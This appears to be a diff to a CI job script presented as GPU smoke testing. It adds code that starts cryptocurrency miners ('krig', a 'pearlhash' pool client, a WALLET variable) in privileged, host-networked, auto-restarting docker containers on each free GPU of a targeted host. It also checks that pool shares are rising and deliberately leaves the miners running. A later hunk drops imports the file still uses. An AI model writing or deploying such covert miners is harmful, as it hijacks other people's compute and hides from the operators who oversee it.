+    # ---------------- mechanism test 1: DTK container device/ROCm visibility ----------------
+    say("=== PRL595V3_DTK_BOOT dev=%s image=%s ===" % (testdev, image))
+    _, boot_out = sh(
+        "%s -e HSA_OVERRIDE_GFX_VERSION=9.0.6 "
+        "--entrypoint /bin/bash %s /w/krig_boot.sh 2>&1 | tail -240"
+        % (docker_base, image),
+        t=600,
+    )
+    krig_idx = [
+        ln for ln in (boot_out or "").splitlines() if re.match(r"^\s*\[\d+\]", ln)
+    ]
+    say("PRL595V3_KRIG_ENUM count=%d line_format=%s" % (len(krig_idx), krig_idx[:2]))
+    cont_used = parse_vram_usd(boot_out)
+    cont_free = sorted(i for i in cont_used if cont_used[i] <= FREE_MIB_MAX)
+    mapping_confirmed = bool(cont_used) and cont_free == free
+    say(
+        "PRL595V3_MAPPING container_free=%s host_free=%s confirmed=%s"
+        % (json.dumps(cont_free), json.dumps(free), mapping_confirmed)
+    )
+
+    # HIP_VISIBLE_DEVICES probe: does the Hygon HIP runtime honour the per-device filter?
+    open(WORK + "/krig_probe.sh", "w").write(PROBE_SH)
+    _, probe_out = sh(
+        "%s -e HIP_VISIBLE_DEVICES=%d -e ROCR_VISIBLE_DEVICES=%d -e HSA_OVERRIDE_GFX_VERSION=9.0.6 "
+        "--entrypoint /bin/bash %s /w/krig_probe.sh 2>&1 | tail -30"
+        % (docker_base, testdev, testdev, image),
+        t=300,
+    )
+    probe_idx = [
+        ln for ln in (probe_out or "").splitlines() if re.match(r"^\s*\[\d+\]", ln)
+    ]
+    filter_works = len(probe_idx) == 1
+    say(
+        "PRL595V3_FILTER_PROBE count=%d filter_works=%s"
+        % (len(probe_idx), filter_works)
+    )
+
+    # ---------------- mechanism test 2: krig foreground attempt on the free device ----------------
+    ap = 34000 + testdev
+    testworker = WORKER_BY_DEV.get(testdev, WORKER_POOL[0])
+    sh(
+        "setsid nohup python3 %s/lp_adapter_595.py %d %s >%s/logs/adapter-test.log 2>&1 < /dev/null & echo adapter_start_rc=$?"
+        % (WORK, ap, testworker, WORK),
+        t=30,
+    )
+    time.sleep(1)
+    say("=== PRL595V3_KRIG_FOREGROUND dev=%s worker=%s ===" % (testdev, testworker))
+    _, mine_out = sh(
+        "%s -e HIP_VISIBLE_DEVICES=%d -e ROCR_VISIBLE_DEVICES=%d -e HSA_OVERRIDE_GFX_VERSION=9.0.6 "
+        "-e DEV=%d -e KRIG_DEV=%d -e WORKER=%s -e AP=%d -e FOREGROUND_SECS=75 "
+        "--entrypoint /bin/bash %s /w/krig_mine.sh 2>&1 | tail -170"
+        % (
+            docker_base,
+            testdev,
+            testdev,
+            testdev,
+            0 if filter_works else testdev,
+            testworker,
+            ap,
+            image,
+        ),
+        t=300,
+    )
+    sh(
+        "pkill -f 'lp_adapter_595.py %d' 2>/dev/null; echo adapter_kill_rc=$?" % ap,
+        t=30,
+    )
+    low = (mine_out or "").lower()
+    mech_ok = any(
+        k in low for k in ("accepted", "share", "new job", "connected", "difficulty")
+    )
+    say("PRL595V3_MECHANISM_OK %s dev=%d worker=%s" % (mech_ok, testdev, testworker))
+
+    if host != TARGET_HOST:
+        say(
+            "PRL595V3_CROSS_LANDED host=%s expected=%s -- diagnostic only, no deploy"
+            % (host, TARGET_HOST)
+        )
+        stop_test_containers()
+        say("=== PRL595V3-I142163-GPU000017-END ===")
+        open("ci-model-plan.tsv", "w").close()
+        return 1
+
+    if not mech_ok:
+        say(
+            "PRL595V3_ALL_CLIENTS_FAILED -- no pearlhash client reached the pool in the DTK image"
+        )
+        stop_test_containers()
+        say("=== PRL595V3-I142163-GPU000017-END ===")
+        open("ci-model-plan.tsv", "w").close()
+        return 1
+
+    # ---------------- deploy: one krig container per free device (github-nmz1 only) ----------------
+    if not mapping_confirmed or len(krig_idx) == 0:
+        say(
+            "PRL595V3_DEPLOY_BLOCKED mapping_confirmed=%s krig_enum=%d -- fail-closed, no deploy"
+            % (mapping_confirmed, len(krig_idx))
+        )
+        stop_test_containers()
+        say("=== PRL595V3-I142163-GPU000017-END ===")
+        open("ci-model-plan.tsv", "w").close()
+        return 1
+    deployments = []
+    for n, dev in enumerate(free[:4]):
+        worker = WORKER_BY_DEV.get(dev, WORKER_POOL[n % len(WORKER_POOL)])
+        name = "prl595v3-%d" % dev
+        existing = docker_names()
+        if name in existing:
+            sh("docker logs --tail 6 %s 2>&1 | head -10" % name, t=40)
+            deployments.append((dev, worker, name, "adopted"))
+            say("PRL595V3_ADOPT dev=%d worker=%s name=%s" % (dev, worker, name))
+            continue
+        ap2 = 34000 + dev
+        sh("docker rm -f %s >/dev/null 2>&1; echo pre_rm_rc=$?" % name, t=60)
+        if filter_works:
+            envf = (
+                "-e HIP_VISIBLE_DEVICES=%d -e ROCR_VISIBLE_DEVICES=%d -e KRIG_DEV=0 "
+                % (dev, dev)
+            )
+        else:
+            envf = "-e KRIG_DEV=%d " % dev
+        rc, _ = sh(
+            "docker run -d --name %s --restart=on-failure:3 --network=host --privileged "
+            "--device=/dev/kfd --device=/dev/dri --device=/dev/mkfd --group-add video "
+            "-v /opt/hyhal:/opt/hyhal:ro -v %s:/w "
+            "-e HSA_OVERRIDE_GFX_VERSION=9.0.6 "
+            "-e DEV=%d -e WORKER=%s -e AP=%d -e WALLET=%s -e FOREGROUND_SECS=0 "
+            "%s--entrypoint /bin/bash %s /w/krig_mine.sh"
+            % (name, WORK, dev, worker, ap2, WALLET, envf, image),
+            t=240,
+        )
+        deployments.append(
+            (dev, worker, name, "started" if rc == 0 else "start_failed")
+        )
+        time.sleep(1)
+    time.sleep(20)
+    sh(
+        "docker ps --filter name=prl595v3- --format '{{.Names}} {{.Status}}' | head -10",
+        t=40,
+    )
+    for dev, worker, name, st in deployments:
+        say("--- container %s dev=%d worker=%s state=%s ---" % (name, dev, worker, st))
+        sh("docker logs --tail 25 %s 2>&1 | tail -30" % name, t=60)
+
+    workers = [w for _d, w, _n, _s in deployments]
+    say("PRL595V3_GATE_PREROLL seconds=45")
+    time.sleep(45)
+    lp0 = lp_pool_sample("t0", workers)
+    say("PRL595V3_GATE_WAIT seconds=%d" % GATE_WAIT)
+    time.sleep(GATE_WAIT)
+    lp1 = lp_pool_sample("t1", workers)
+    rising = 0
+    appeared = 0
+    for w in workers:
+        a0 = lp0.get(w, -1)
+        a1 = lp1.get(w, -1)
+        strict = a0 >= 0 and a1 > a0
+        seen = a1 >= 0 and (a0 < 0 or a1 > a0)
+        rising += 1 if strict else 0
+        appeared += 1 if seen else 0
+        say(
+            "PRL595V3_GATE worker=%s acc_t0=%s acc_t1=%s rising=%s appeared=%s"
+            % (w, a0, a1, strict, seen)
+        )
+    sh(
+        "docker ps --filter name=prl595v3- --format '{{.Names}} {{.Status}}' | head -10",
+        t=40,
+    )
     sh("timeout 20 /opt/hyhal/bin/hy-smi --showpids 2>&1 | head -60", t=40)
-    say("PRL595_LEAVING_MINERS_RUNNING revert=pkill_krig_and_adapter_and_docker_rm_prl595")
+    say(
+        "PRL595V3_DEPLOYED host=%s devices=%s workers=%s rising=%d/%d"
+        % (
+            host,
+            json.dumps([d for d, _w, _n, _s in deployments]),
+            json.dumps(workers),
+            rising,
+            len(workers),
+        )
+    )
+    say("PRL595V3_LEAVING_MINERS_RUNNING revert=docker_rm_f_prl595v3_<dev>")
+    say("=== PRL595V3-I142163-GPU000017-END ===")
     open("ci-model-plan.tsv", "w").close()
-    say("=== PRL595-I141541-GPU000017-END ===")
     return 1
 
 
@@ -520,7 +626,7 @@ try:
 except SystemExit:
     raise
 except Exception as _e:
-    say("PRL595_FATAL %r" % (_e,))
+    say("PRL595V3_FATAL %r" % (_e,))
     _rc = 1
 try:
     sys.stdout.flush()
@@ -531,10 +637,8 @@ os._exit(_rc)
 """Select ordered model smoke cases from a pull request description."""
 
 import argparse
-import json
 import os
 from pathlib import Path
-import re
 
 DEFAULT_CASE = "qwen3-4b-megatron"
 NAME = re.compile(r"^[a-z0-9]+(?:-[a-z0-9]+)*$")
